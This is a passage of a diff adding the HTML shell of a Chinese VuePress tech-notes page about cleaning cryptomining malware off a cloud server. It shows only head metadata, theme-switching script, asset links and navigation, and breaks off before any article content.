@@ -1,0 +1,808 @@
+<!doctype html>
+<html lang="en-US" data-theme="light">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <meta name="generator" content="VuePress 2.0.0-rc.23" />
+    <meta name="theme" content="VuePress Theme Hope 2.0.0-rc.92" />
+    <style>
+      :root {
+        --vp-c-bg: #fff;
+      }
+
+      [data-theme="dark"] {
+        --vp-c-bg: #1b1b1f;
+      }
+
+      html,
+      body {
+        background: var(--vp-c-bg);
+      }
+    </style>
+    <script>
+      const userMode = localStorage.getItem("vuepress-theme-hope-scheme");
+      const systemDarkMode =
+        window.matchMedia &&
+        window.matchMedia("(prefers-color-scheme: dark)").matches;
+
+      if (userMode === "dark" || (userMode !== "light" && systemDarkMode)) {
+        document.documentElement.setAttribute("data-theme", "dark");
+      }
+    </script>
+    <link rel="icon" href="/images/logo.png"><link rel="manifest" href="/images/logo.png"><link rel="apple-touch-icon" href="/images/logo.png"><meta http-quiv="pragma" cotent="no-cache"><meta http-quiv="pragma" cotent="no-cache,must-revalidate"><meta http-quiv="expires" cotent="0"><title>20230817-阿里云美国某节点服务器被挂挖矿恶意软件的解决 | 星哥的私有笔记</title><meta name="description" content="星哥说事vuepress描述，包含前端、后端、运维、等技术的介绍">
+    <link rel="preload" href="/assets/style-Bxags5vD.css" as="style"><link rel="stylesheet" href="/assets/style-Bxags5vD.css">
+    <link rel="modulepreload" href="/assets/app-DbDHfX93.js"><link rel="modulepreload" href="/assets/index.html-OCUbtvZS.js"><link rel="modulepreload" href="/assets/plugin-vue_export-helper-DlAUqK2U.js">
+    <link rel="prefetch" href="/assets/index.html-eZXzfff_.js" as="script"><link rel="prefetch" href="/assets/index.html-8SviFC0v.js" as="script"><link rel="prefetch" href="/assets/index.html-0cYtIcQa.js" as="script"><link rel="prefetch" href="/assets/index.html-wfjv2MEp.js" as="script"><link rel="prefetch" href="/assets/index.html-B_vK0UZa.js" as="script"><link rel="prefetch" href="/assets/index.html-MIaebi4q.js" as="script"><link rel="prefetch" href="/assets/index.html-iNN_umWo.js" as="script"><link rel="prefetch" href="/assets/index.html-B0LKsF9e.js" as="script"><link rel="prefetch" href="/assets/index.html-D95lnmEJ.js" as="script"><link rel="prefetch" href="/assets/index.html-CxKNsANZ.js" as="script"><link rel="prefetch" href="/assets/index.html-B9TzsANL.js" as="script"><link rel="prefetch" href="/assets/index.html-DYpW5e4p.js" as="script"><link rel="prefetch" href="/assets/index.html-BKjwIgT4.js" as="script"><link rel="prefetch" href="/assets/index.html-Cw1KxQsY.js" as="script"><link rel="prefetch" href="/assets/index.html-TmtLQr1L.js" as="script"><link rel="prefetch" href="/assets/index.html-BU1AO83n.js" as="script"><link rel="prefetch" href="/assets/index.html-Dvwsrhfi.js" as="script"><link rel="prefetch" href="/assets/index.html-Dq5EzwAs.js" as="script"><link rel="prefetch" href="/assets/index.html-DSo4ACP3.js" as="script"><link rel="prefetch" href="/assets/index.html-DQW6sTRq.js" as="script"><link rel="prefetch" href="/assets/index.html-STL1SF9I.js" as="script"><link rel="prefetch" href="/assets/index.html-C8H8ByOA.js" as="script"><link rel="prefetch" href="/assets/index.html-CSukQY6J.js" as="script"><link rel="prefetch" href="/assets/index.html-BPeT_rL8.js" as="script"><link rel="prefetch" href="/assets/index.html-Hp9HN8h7.js" as="script"><link rel="prefetch" href="/assets/index.html-BP4U2Xi-.js" as="script"><link rel="prefetch" href="/assets/index.html-DqyRPmxH.js" as="script"><link rel="prefetch" href="/assets/index.html-joCNMZmK.js" as="script"><link rel="prefetch" href="/assets/index.html-BCAg_KhP.js" as="script"><link rel="prefetch" href="/assets/index.html-CtvfNXV6.js" as="script"><link rel="prefetch" href="/assets/index.html-BzGPUWIf.js" as="script"><link rel="prefetch" href="/assets/index.html-BKgs1xA-.js" as="script"><link rel="prefetch" href="/assets/index.html-DUKvhXam.js" as="script"><link rel="prefetch" href="/assets/index.html-CiiMGtHk.js" as="script"><link rel="prefetch" href="/assets/index.html-DGiRwdSh.js" as="script"><link rel="prefetch" href="/assets/index.html-Dutwemni.js" as="script"><link rel="prefetch" href="/assets/index.html-DghU0Xuw.js" as="script"><link rel="prefetch" href="/assets/index.html-5Tvt99Bw.js" as="script"><link rel="prefetch" href="/assets/index.html-C3EXwbco.js" as="script"><link rel="prefetch" href="/assets/index.html-Ce1E0uSn.js" as="script"><link rel="prefetch" href="/assets/index.html-BkRwzDud.js" as="script"><link rel="prefetch" href="/assets/index.html-Dh2JI9oP.js" as="script"><link rel="prefetch" href="/assets/index.html-BQUkB76o.js" as="script"><link rel="prefetch" href="/assets/index.html-owY23DO7.js" as="script"><link rel="prefetch" href="/assets/index.html-BJc5IVE6.js" as="script"><link rel="prefetch" href="/assets/index.html-8CIXlPol.js" as="script"><link rel="prefetch" href="/assets/index.html-CmgIYDAv.js" as="script"><link rel="prefetch" href="/assets/index.html-B8siybp8.js" as="script"><link rel="prefetch" href="/assets/index.html-BC5r_7uF.js" as="script"><link rel="prefetch" href="/assets/index.html-DTh7Eol3.js" as="script"><link rel="prefetch" href="/assets/index.html-Dwd8MQF8.js" as="script"><link rel="prefetch" href="/assets/index.html-vWFJ4x-g.js" as="script"><link rel="prefetch" href="/assets/index.html-oy3cPAl3.js" as="script"><link rel="prefetch" href="/assets/index.html-BYuQjE2V.js" as="script"><link rel="prefetch" href="/assets/index.html-rGWCMoWG.js" as="script"><link rel="prefetch" href="/assets/index.html-D6vTaqSR.js" as="script"><link rel="prefetch" href="/assets/index.html-BERVIO7k.js" as="script"><link rel="prefetch" href="/assets/index.html-BMSpneU5.js" as="script"><link rel="prefetch" href="/assets/index.html-yTAluGtA.js" as="script"><link rel="prefetch" href="/assets/index.html-Cf-dTnyf.js" as="script"><link rel="prefetch" href="/assets/index.html-DbX00ZVP.js" as="script"><link rel="prefetch" href="/assets/index.html-DP_yIl_B.js" as="script"><link rel="prefetch" href="/assets/index.html-jmZ-ZW9C.js" as="script"><link rel="prefetch" href="/assets/index.html-DVHOEF2S.js" as="script"><link rel="prefetch" href="/assets/index.html-DGSEW9Ts.js" as="script"><link rel="prefetch" href="/assets/index.html-DmBrdtXC.js" as="script"><link rel="prefetch" href="/assets/index.html-DdTlOMgn.js" as="script"><link rel="prefetch" href="/assets/index.html-CsVruGml.js" as="script"><link rel="prefetch" href="/assets/index.html-DWT1OCcl.js" as="script"><link rel="prefetch" href="/assets/index.html-CgKn-Xbn.js" as="script"><link rel="prefetch" href="/assets/index.html-CSG-DDb3.js" as="script"><link rel="prefetch" href="/assets/index.html-op8SJUUX.js" as="script"><link rel="prefetch" href="/assets/index.html-Bcdo8Qzf.js" as="script"><link rel="prefetch" href="/assets/index.html--9FiLj1l.js" as="script"><link rel="prefetch" href="/assets/index.html-paUzJCsK.js" as="script"><link rel="prefetch" href="/assets/index.html-_0VeLTJh.js" as="script"><link rel="prefetch" href="/assets/index.html-Buc38gbu.js" as="script"><link rel="prefetch" href="/assets/index.html-Dz2D9jkp.js" as="script"><link rel="prefetch" href="/assets/index.html-ClGsDGi6.js" as="script"><link rel="prefetch" href="/assets/index.html-z7SMOcTf.js" as="script"><link rel="prefetch" href="/assets/index.html-CZlVJoN6.js" as="script"><link rel="prefetch" href="/assets/index.html-DDySWn3E.js" as="script"><link rel="prefetch" href="/assets/index.html-BX7XktWP.js" as="script"><link rel="prefetch" href="/assets/index.html-DjOYJniH.js" as="script"><link rel="prefetch" href="/assets/index.html-WtGqn70g.js" as="script"><link rel="prefetch" href="/assets/index.html-t5lxT43c.js" as="script"><link rel="prefetch" href="/assets/index.html-CevS5XvC.js" as="script"><link rel="prefetch" href="/assets/index.html-DgLaW868.js" as="script"><link rel="prefetch" href="/assets/index.html-SkSMoj6j.js" as="script"><link rel="prefetch" href="/assets/index.html-Bx0GLzTb.js" as="script"><link rel="prefetch" href="/assets/index.html-bnqvWGLh.js" as="script"><link rel="prefetch" href="/assets/index.html-DIkhRy2p.js" as="script"><link rel="prefetch" href="/assets/index.html-D9sE45Od.js" as="script"><link rel="prefetch" href="/assets/index.html-DnVIYUTv.js" as="script"><link rel="prefetch" href="/assets/index.html-DiXnFNJe.js" as="script"><link rel="prefetch" href="/assets/index.html-C6XgRu0f.js" as="script"><link rel="prefetch" href="/assets/index.html-ey5qFm4N.js" as="script"><link rel="prefetch" href="/assets/index.html-CL5AV26M.js" as="script"><link rel="prefetch" href="/assets/index.html-iKncAVhZ.js" as="script"><link rel="prefetch" href="/assets/index.html-D1NViYZ6.js" as="script"><link rel="prefetch" href="/assets/index.html-9EBfSm3P.js" as="script"><link rel="prefetch" href="/assets/index.html-Cp_AByYv.js" as="script"><link rel="prefetch" href="/assets/index.html-BwFarfv9.js" as="script"><link rel="prefetch" href="/assets/index.html-Brf6rW4r.js" as="script"><link rel="prefetch" href="/assets/index.html-6wuyuZLG.js" as="script"><link rel="prefetch" href="/assets/index.html-iYuhQBIO.js" as="script"><link rel="prefetch" href="/assets/index.html-DnYpur-C.js" as="script"><link rel="prefetch" href="/assets/index.html-Dn6G7MOc.js" as="script"><link rel="prefetch" href="/assets/index.html-Vm0qZBeq.js" as="script"><link rel="prefetch" href="/assets/index.html-D-AJsMpS.js" as="script"><link rel="prefetch" href="/assets/index.html-D49Vc63e.js" as="script"><link rel="prefetch" href="/assets/index.html-Bovf3N2r.js" as="script"><link rel="prefetch" href="/assets/index.html-Hu-WQ7AC.js" as="script"><link rel="prefetch" href="/assets/index.html-BWruQJeJ.js" as="script"><link rel="prefetch" href="/assets/index.html-JAqevzn7.js" as="script"><link rel="prefetch" href="/assets/index.html-DB2GbfLR.js" as="script"><link rel="prefetch" href="/assets/index.html--MxBT58i.js" as="script"><link rel="prefetch" href="/assets/index.html--H0QWHJA.js" as="script"><link rel="prefetch" href="/assets/index.html-1DKDFYaH.js" as="script"><link rel="prefetch" href="/assets/index.html-fQFjALM1.js" as="script"><link rel="prefetch" href="/assets/index.html-DW3iFN1T.js" as="script"><link rel="prefetch" href="/assets/index.html-MwL4ZkRt.js" as="script"><link rel="prefetch" href="/assets/index.html-CBDHkIkd.js" as="script"><link rel="prefetch" href="/assets/index.html-lo27F1Rp.js" as="script"><link rel="prefetch" href="/assets/index.html-8nX0TAbP.js" as="script"><link rel="prefetch" href="/assets/index.html-nQfV1ckj.js" as="script"><link rel="prefetch" href="/assets/index.html-BqXibxaV.js" as="script"><link rel="prefetch" href="/assets/index.html-DYfyGaAJ.js" as="script"><link rel="prefetch" href="/assets/index.html-B7stAd3G.js" as="script"><link rel="prefetch" href="/assets/index.html-DltLErl3.js" as="script"><link rel="prefetch" href="/assets/index.html-awU5mArk.js" as="script"><link rel="prefetch" href="/assets/index.html-BJubroE8.js" as="script"><link rel="prefetch" href="/assets/index.html-BnFwuEdY.js" as="script"><link rel="prefetch" href="/assets/index.html-CO0an80u.js" as="script"><link rel="prefetch" href="/assets/index.html-mN6hF8_0.js" as="script"><link rel="prefetch" href="/assets/index.html-CRw5IIsM.js" as="script"><link rel="prefetch" href="/assets/index.html-CamFDOyU.js" as="script"><link rel="prefetch" href="/assets/index.html-BeN601Ih.js" as="script"><link rel="prefetch" href="/assets/index.html-C78ZpBbV.js" as="script"><link rel="prefetch" href="/assets/index.html-DBO3H-G5.js" as="script"><link rel="prefetch" href="/assets/index.html-DOFQG5pJ.js" as="script"><link rel="prefetch" href="/assets/index.html-DUKvRiY5.js" as="script"><link rel="prefetch" href="/assets/index.html-B6Dp74Xe.js" as="script"><link rel="prefetch" href="/assets/index.html-Yucsi_VV.js" as="script"><link rel="prefetch" href="/assets/index.html--5_ugEcm.js" as="script"><link rel="prefetch" href="/assets/index.html-Ds1c1tmX.js" as="script"><link rel="prefetch" href="/assets/index.html-B3kNWZiJ.js" as="script"><link rel="prefetch" href="/assets/index.html-DTWHXWvI.js" as="script"><link rel="prefetch" href="/assets/index.html-Da5_Om_d.js" as="script"><link rel="prefetch" href="/assets/index.html-CkhKac9b.js" as="script"><link rel="prefetch" href="/assets/index.html-I4SIJomj.js" as="script"><link rel="prefetch" href="/assets/index.html-BSaUZRMq.js" as="script"><link rel="prefetch" href="/assets/index.html-BnqP1og3.js" as="script"><link rel="prefetch" href="/assets/index.html-DA7IPbK7.js" as="script"><link rel="prefetch" href="/assets/index.html-CO0k1h9Q.js" as="script"><link rel="prefetch" href="/assets/index.html-ahNPhp_2.js" as="script"><link rel="prefetch" href="/assets/index.html-BzSltYff.js" as="script"><link rel="prefetch" href="/assets/index.html-Cf1kXQ0R.js" as="script"><link rel="prefetch" href="/assets/index.html-DASfekJV.js" as="script"><link rel="prefetch" href="/assets/index.html-VqTUhG03.js" as="script"><link rel="prefetch" href="/assets/index.html-DhcKjV4S.js" as="script"><link rel="prefetch" href="/assets/index.html-84qoYCRE.js" as="script"><link rel="prefetch" href="/assets/index.html-jtV7hrOu.js" as="script"><link rel="prefetch" href="/assets/index.html-YQKK5QIX.js" as="script"><link rel="prefetch" href="/assets/index.html-BxZt_aiF.js" as="script"><link rel="prefetch" href="/assets/index.html-Ct82R28d.js" as="script"><link rel="prefetch" href="/assets/index.html-D69E8uJ7.js" as="script"><link rel="prefetch" href="/assets/index.html-BJshn9Q6.js" as="script"><link rel="prefetch" href="/assets/index.html-Bl9fjRUC.js" as="script"><link rel="prefetch" href="/assets/index.html-pFQR13ze.js" as="script"><link rel="prefetch" href="/assets/index.html-cHus_jHH.js" as="script"><link rel="prefetch" href="/assets/index.html-Cx9WfKCV.js" as="script"><link rel="prefetch" href="/assets/index.html-B6HzGQAi.js" as="script"><link rel="prefetch" href="/assets/index.html-DITD3o2H.js" as="script"><link rel="prefetch" href="/assets/index.html-DaPYBWoM.js" as="script"><link rel="prefetch" href="/assets/index.html-CyYIwTkR.js" as="script"><link rel="prefetch" href="/assets/index.html-ByMOkErQ.js" as="script"><link rel="prefetch" href="/assets/index.html-CbmeE6UD.js" as="script"><link rel="prefetch" href="/assets/index.html-CmSx2qnz.js" as="script"><link rel="prefetch" href="/assets/index.html-aBIMSIM5.js" as="script"><link rel="prefetch" href="/assets/index.html-CE2czzyF.js" as="script"><link rel="prefetch" href="/assets/index.html-ByrCYE0Q.js" as="script"><link rel="prefetch" href="/assets/index.html-CS7AhsZU.js" as="script"><link rel="prefetch" href="/assets/index.html-DlbrlCJd.js" as="script"><link rel="prefetch" href="/assets/index.html-TGcX_oH6.js" as="script"><link rel="prefetch" href="/assets/index.html-DACkozSV.js" as="script"><link rel="prefetch" href="/assets/index.html-DsfQWDH6.js" as="script"><link rel="prefetch" href="/assets/index.html-D6zpOM4s.js" as="script"><link rel="prefetch" href="/assets/index.html-jRsUfapS.js" as="script"><link rel="prefetch" href="/assets/index.html-CRaDd0wR.js" as="script"><link rel="prefetch" href="/assets/index.html-CRvq6a2W.js" as="script"><link rel="prefetch" href="/assets/index.html-DWMFchkn.js" as="script"><link rel="prefetch" href="/assets/index.html-C6ZeEn7f.js" as="script"><link rel="prefetch" href="/assets/index.html-BRu9F2d_.js" as="script"><link rel="prefetch" href="/assets/index.html-Ck3jKaIS.js" as="script"><link rel="prefetch" href="/assets/index.html-NkO4-VUK.js" as="script"><link rel="prefetch" href="/assets/index.html-CEodDQGd.js" as="script"><link rel="prefetch" href="/assets/index.html-DMkf0Oyx.js" as="script"><link rel="prefetch" href="/assets/index.html-DEEfX50c.js" as="script"><link rel="prefetch" href="/assets/index.html-DxgP0FAp.js" as="script"><link rel="prefetch" href="/assets/index.html-fshf4yP_.js" as="script"><link rel="prefetch" href="/assets/index.html-CRH48WdM.js" as="script"><link rel="prefetch" href="/assets/index.html-3W3mrjxX.js" as="script"><link rel="prefetch" href="/assets/index.html-CmCFNhni.js" as="script"><link rel="prefetch" href="/assets/index.html-HWj1i2h6.js" as="script"><link rel="prefetch" href="/assets/index.html-bs5DHYKu.js" as="script"><link rel="prefetch" href="/assets/index.html-CttoldNL.js" as="script"><link rel="prefetch" href="/assets/index.html-CaXtQchT.js" as="script"><link rel="prefetch" href="/assets/index.html-mm1W2Zt3.js" as="script"><link rel="prefetch" href="/assets/index.html-DPmfnnVp.js" as="script"><link rel="prefetch" href="/assets/index.html-3be9PA1y.js" as="script"><link rel="prefetch" href="/assets/index.html-Juyy0Njl.js" as="script"><link rel="prefetch" href="/assets/index.html-hjpIlWhY.js" as="script"><link rel="prefetch" href="/assets/index.html-B6vYLBu4.js" as="script"><link rel="prefetch" href="/assets/index.html-BYrVdRnY.js" as="script"><link rel="prefetch" href="/assets/index.html-BTXz2iSi.js" as="script"><link rel="prefetch" href="/assets/index.html-BrnA7ksU.js" as="script"><link rel="prefetch" href="/assets/index.html-BwUlaQXt.js" as="script"><link rel="prefetch" href="/assets/index.html-EY_5Ys7p.js" as="script"><link rel="prefetch" href="/assets/index.html-Cqv5RijC.js" as="script"><link rel="prefetch" href="/assets/index.html-IG2qTaCd.js" as="script"><link rel="prefetch" href="/assets/index.html-CUWvk_K7.js" as="script"><link rel="prefetch" href="/assets/index.html-DqnYgebG.js" as="script"><link rel="prefetch" href="/assets/index.html-BfT6hM1V.js" as="script"><link rel="prefetch" href="/assets/index.html-7GsTBYyb.js" as="script"><link rel="prefetch" href="/assets/index.html-CRYyDNGx.js" as="script"><link rel="prefetch" href="/assets/index.html-CJfeDZCr.js" as="script"><link rel="prefetch" href="/assets/index.html-BYnKENvF.js" as="script"><link rel="prefetch" href="/assets/index.html-BgVhuXqT.js" as="script"><link rel="prefetch" href="/assets/index.html-2jhvGYc6.js" as="script"><link rel="prefetch" href="/assets/index.html-DWOkTvnb.js" as="script"><link rel="prefetch" href="/assets/index.html-C9e3jWAM.js" as="script"><link rel="prefetch" href="/assets/index.html-VaRfgpC8.js" as="script"><link rel="prefetch" href="/assets/index.html-DtfsgCjX.js" as="script"><link rel="prefetch" href="/assets/index.html-ucM4bvgL.js" as="script"><link rel="prefetch" href="/assets/index.html-BMUsyi28.js" as="script"><link rel="prefetch" href="/assets/index.html-4Jk0_-N5.js" as="script"><link rel="prefetch" href="/assets/index.html-D1TumnUE.js" as="script"><link rel="prefetch" href="/assets/index.html-D-Ju1S6t.js" as="script"><link rel="prefetch" href="/assets/index.html-GHzGYIHd.js" as="script"><link rel="prefetch" href="/assets/index.html-CUfJsspw.js" as="script"><link rel="prefetch" href="/assets/index.html-DVXSo8Ov.js" as="script"><link rel="prefetch" href="/assets/index.html--akOX6xk.js" as="script"><link rel="prefetch" href="/assets/index.html-BjVxuzwf.js" as="script"><link rel="prefetch" href="/assets/index.html-CLFXJQyV.js" as="script"><link rel="prefetch" href="/assets/index.html-YKbGU9zV.js" as="script"><link rel="prefetch" href="/assets/index.html-DbON4dNe.js" as="script"><link rel="prefetch" href="/assets/index.html-B8R39YDd.js" as="script"><link rel="prefetch" href="/assets/index.html-DtN53bPw.js" as="script"><link rel="prefetch" href="/assets/index.html-BKNz4mjl.js" as="script"><link rel="prefetch" href="/assets/index.html-XFvRQxc0.js" as="script"><link rel="prefetch" href="/assets/index.html-DHFR7q9W.js" as="script"><link rel="prefetch" href="/assets/index.html-CHJ5HCj_.js" as="script"><link rel="prefetch" href="/assets/index.html-Bd6ZQalV.js" as="script"><link rel="prefetch" href="/assets/index.html-DlCnROau.js" as="script"><link rel="prefetch" href="/assets/index.html-CzQ_uCK-.js" as="script"><link rel="prefetch" href="/assets/index.html-CExB_61T.js" as="script"><link rel="prefetch" href="/assets/index.html-Gc8FsEy1.js" as="script"><link rel="prefetch" href="/assets/index.html-BMP5vehv.js" as="script"><link rel="prefetch" href="/assets/index.html-DxfHAZwX.js" as="script"><link rel="prefetch" href="/assets/index.html-Bwe4qIYC.js" as="script"><link rel="prefetch" href="/assets/index.html-YkO7lBx1.js" as="script"><link rel="prefetch" href="/assets/index.html-Djl70StU.js" as="script"><link rel="prefetch" href="/assets/index.html-8he7pvcY.js" as="script"><link rel="prefetch" href="/assets/index.html-zs6zWwfT.js" as="script"><link rel="prefetch" href="/assets/index.html-D76SNpgD.js" as="script"><link rel="prefetch" href="/assets/index.html-CHMqIe84.js" as="script"><link rel="prefetch" href="/assets/index.html-CUjQ_eru.js" as="script"><link rel="prefetch" href="/assets/index.html-oICo3hbZ.js" as="script"><link rel="prefetch" href="/assets/index.html-qnWgwTqR.js" as="script"><link rel="prefetch" href="/assets/index.html-kg6Kmj8X.js" as="script"><link rel="prefetch" href="/assets/index.html-CLDmAaAw.js" as="script"><link rel="prefetch" href="/assets/index.html-DUvoBLU-.js" as="script"><link rel="prefetch" href="/assets/index.html-DtchV5r5.js" as="script"><link rel="prefetch" href="/assets/index.html-DzRsxgud.js" as="script"><link rel="prefetch" href="/assets/index.html-CPEilUKz.js" as="script"><link rel="prefetch" href="/assets/index.html-7KFxNeDE.js" as="script"><link rel="prefetch" href="/assets/index.html-Ddqbsn-l.js" as="script"><link rel="prefetch" href="/assets/index.html-CGjYCIM2.js" as="script"><link rel="prefetch" href="/assets/index.html-B99CkQSv.js" as="script"><link rel="prefetch" href="/assets/index.html-B7zlRHQG.js" as="script"><link rel="prefetch" href="/assets/index.html-BdpNQ1Ze.js" as="script"><link rel="prefetch" href="/assets/index.html-URM3b0hq.js" as="script"><link rel="prefetch" href="/assets/index.html-DyV6bczg.js" as="script"><link rel="prefetch" href="/assets/index.html-DcQyxexr.js" as="script"><link rel="prefetch" href="/assets/index.html-CZ-PrWlK.js" as="script"><link rel="prefetch" href="/assets/index.html-TsninqSB.js" as="script"><link rel="prefetch" href="/assets/index.html-STXjoq2G.js" as="script"><link rel="prefetch" href="/assets/index.html-qeICZqQM.js" as="script"><link rel="prefetch" href="/assets/index.html-BFUUJUbV.js" as="script"><link rel="prefetch" href="/assets/index.html-BW3vUvty.js" as="script"><link rel="prefetch" href="/assets/index.html-FFupDttq.js" as="script"><link rel="prefetch" href="/assets/index.html-Dnk_18qQ.js" as="script"><link rel="prefetch" href="/assets/index.html-CnyCAEzW.js" as="script"><link rel="prefetch" href="/assets/index.html-CHmhEL1F.js" as="script"><link rel="prefetch" href="/assets/index.html-CWDGOCP8.js" as="script"><link rel="prefetch" href="/assets/index.html-CbXWzYJP.js" as="script"><link rel="prefetch" href="/assets/index.html-Ny54P2FE.js" as="script"><link rel="prefetch" href="/assets/index.html-BmVp2o6P.js" as="script"><link rel="prefetch" href="/assets/index.html-Bg4-y4K5.js" as="script"><link rel="prefetch" href="/assets/index.html-C0Lk5bon.js" as="script"><link rel="prefetch" href="/assets/index.html-CkxqhhEJ.js" as="script"><link rel="prefetch" href="/assets/index.html-CprG1mC-.js" as="script"><link rel="prefetch" href="/assets/index.html-D-DvmbD9.js" as="script"><link rel="prefetch" href="/assets/index.html-D1iQFlAX.js" as="script"><link rel="prefetch" href="/assets/index.html-Don-6jIm.js" as="script"><link rel="prefetch" href="/assets/index.html-BsVN5b0j.js" as="script"><link rel="prefetch" href="/assets/index.html-DgXJZlQZ.js" as="script"><link rel="prefetch" href="/assets/index.html-D0uAwy5P.js" as="script"><link rel="prefetch" href="/assets/index.html-D3IKAVT2.js" as="script"><link rel="prefetch" href="/assets/index.html-DzrgjQmT.js" as="script"><link rel="prefetch" href="/assets/index.html-D4dZWRWF.js" as="script"><link rel="prefetch" href="/assets/index.html-DkknrscS.js" as="script"><link rel="prefetch" href="/assets/index.html-THHO9G3p.js" as="script"><link rel="prefetch" href="/assets/index.html-YP7fbNlR.js" as="script"><link rel="prefetch" href="/assets/index.html-CZvcTujj.js" as="script"><link rel="prefetch" href="/assets/index.html-C71unLRG.js" as="script"><link rel="prefetch" href="/assets/index.html-DiTyYVie.js" as="script"><link rel="prefetch" href="/assets/index.html-CvWVlRYi.js" as="script"><link rel="prefetch" href="/assets/index.html-CXvBR4cv.js" as="script"><link rel="prefetch" href="/assets/index.html-iJdnKynR.js" as="script"><link rel="prefetch" href="/assets/index.html-DMI0J7T6.js" as="script"><link rel="prefetch" href="/assets/index.html-Bn7Q7FVB.js" as="script"><link rel="prefetch" href="/assets/index.html-BrUHf7dl.js" as="script"><link rel="prefetch" href="/assets/index.html-DLr0plmR.js" as="script"><link rel="prefetch" href="/assets/index.html-vf39jnue.js" as="script"><link rel="prefetch" href="/assets/index.html-CYLlVzQX.js" as="script"><link rel="prefetch" href="/assets/index.html-Cr7Xo8To.js" as="script"><link rel="prefetch" href="/assets/index.html-ClV02EyF.js" as="script"><link rel="prefetch" href="/assets/index.html-B8JplILY.js" as="script"><link rel="prefetch" href="/assets/index.html-BLqfgArR.js" as="script"><link rel="prefetch" href="/assets/index.html-DxFw4eS1.js" as="script"><link rel="prefetch" href="/assets/index.html-4OUQzzfx.js" as="script"><link rel="prefetch" href="/assets/index.html-DzaG8Xw8.js" as="script"><link rel="prefetch" href="/assets/index.html-DGk8wQTF.js" as="script"><link rel="prefetch" href="/assets/index.html-CLRWB3vU.js" as="script"><link rel="prefetch" href="/assets/index.html-BZ5AIWCF.js" as="script"><link rel="prefetch" href="/assets/index.html-C00JctPJ.js" as="script"><link rel="prefetch" href="/assets/index.html-7NeZ1C9j.js" as="script"><link rel="prefetch" href="/assets/index.html-KYp_nkHn.js" as="script"><link rel="prefetch" href="/assets/index.html-DdeEvycF.js" as="script"><link rel="prefetch" href="/assets/index.html-B7POEovC.js" as="script"><link rel="prefetch" href="/assets/index.html-BKZtw5fz.js" as="script"><link rel="prefetch" href="/assets/index.html-C8EnmLFz.js" as="script"><link rel="prefetch" href="/assets/index.html-DNgXNwP7.js" as="script"><link rel="prefetch" href="/assets/index.html-B6_CLBES.js" as="script"><link rel="prefetch" href="/assets/index.html-DihRtBV7.js" as="script"><link rel="prefetch" href="/assets/index.html-CA2wy2eH.js" as="script"><link rel="prefetch" href="/assets/index.html-AzUEXhMp.js" as="script"><link rel="prefetch" href="/assets/index.html-DMLpbPQU.js" as="script"><link rel="prefetch" href="/assets/index.html-w64uJ-FQ.js" as="script"><link rel="prefetch" href="/assets/index.html-CQy-58Ym.js" as="script"><link rel="prefetch" href="/assets/index.html-BG4tyddW.js" as="script"><link rel="prefetch" href="/assets/index.html-D1IQVmru.js" as="script"><link rel="prefetch" href="/assets/index.html-BEhzVyEu.js" as="script"><link rel="prefetch" href="/assets/index.html-DiCoWl6s.js" as="script"><link rel="prefetch" href="/assets/index.html-BfUyKMjF.js" as="script"><link rel="prefetch" href="/assets/index.html-Pqfu1Iwt.js" as="script"><link rel="prefetch" href="/assets/index.html-9nSz5fO7.js" as="script"><link rel="prefetch" href="/assets/index.html-DVU2wZih.js" as="script"><link rel="prefetch" href="/assets/index.html-C3zv9kO9.js" as="script"><link rel="prefetch" href="/assets/index.html-WZy6bx5k.js" as="script"><link rel="prefetch" href="/assets/index.html-DodknC9q.js" as="script"><link rel="prefetch" href="/assets/index.html-B8nChqPR.js" as="script"><link rel="prefetch" href="/assets/index.html-Dhqiy6ws.js" as="script"><link rel="prefetch" href="/assets/index.html-CgAjvGl2.js" as="script"><link rel="prefetch" href="/assets/index.html-Cwd8pcmS.js" as="script"><link rel="prefetch" href="/assets/index.html-CDJeLhX8.js" as="script"><link rel="prefetch" href="/assets/index.html-BduaYP1K.js" as="script"><link rel="prefetch" href="/assets/index.html-DmhEV3Ex.js" as="script"><link rel="prefetch" href="/assets/404.html-D3Ro5f-R.js" as="script"><link rel="prefetch" href="/assets/index.html-D5H1d0bn.js" as="script"><link rel="prefetch" href="/assets/index.html-Dt2OKNcR.js" as="script"><link rel="prefetch" href="/assets/index.html-DqJxH-wA.js" as="script"><link rel="prefetch" href="/assets/photoswipe.esm-D2Nf-uDI.js" as="script">
+  </head>
+  <body>
+    <div id="app"><!--[--><!--[--><!--[--><span tabindex="-1"></span><a href="#main-content" class="vp-skip-link sr-only">Skip to main content</a><!--]--><!--[--><div class="theme-container external-link-icon has-toc" vp-container><!--[--><header id="navbar" class="vp-navbar" vp-navbar><div class="vp-navbar-start"><button type="button" class="vp-toggle-sidebar-button" title="Toggle Sidebar"><span class="icon"></span></button><!--[--><a class="route-link vp-brand" href="/" aria-label="Take me home"><!----><!----><span class="vp-site-name">星哥的私有笔记</span></a><!--]--></div><div class="vp-navbar-center"><!--[--><nav class="vp-nav-links"><div class="vp-nav-item hide-in-mobile"><a class="route-link auto-link" href="/" aria-label="首页"><!---->首页<!----></a></div><div class="vp-nav-item hide-in-mobile"><div class="vp-dropdown-wrapper"><button type="button" class="vp-dropdown-title" aria-label="Linux基础教程"><!--[--><!---->Linux基础教程<!--]--><span class="arrow"></span><ul class="vp-dropdown"><li class="vp-dropdown-item"><a class="route-link auto-link" href="/linux-basis/" aria-label="基础知识"><!---->基础知识<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/devops/" aria-label="DevOps"><!---->DevOps<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/web/" aria-label="WEB服务"><!---->WEB服务<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/file-system/" aria-label="文件系统"><!---->文件系统<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/nginx/" aria-label="Nginx"><!---->Nginx<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/docker/" aria-label="Docker"><!---->Docker<!----></a></li></ul></button></div></div><div class="vp-nav-item hide-in-mobile"><div class="vp-dropdown-wrapper"><button type="button" class="vp-dropdown-title" aria-label="开源软件"><!--[--><!---->开源软件<!--]--><span class="arrow"></span><ul class="vp-dropdown"><li class="vp-dropdown-item"><a class="route-link auto-link" href="/kaiyuan/Open-Source-Software/" aria-label="开源软件"><!---->开源软件<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/kaiyuan/Open-databases/" aria-label="数据库"><!---->数据库<!----></a></li><li class="vp-dropdown-item"><a class="route-link auto-link" href="/kaiyuan/android/" 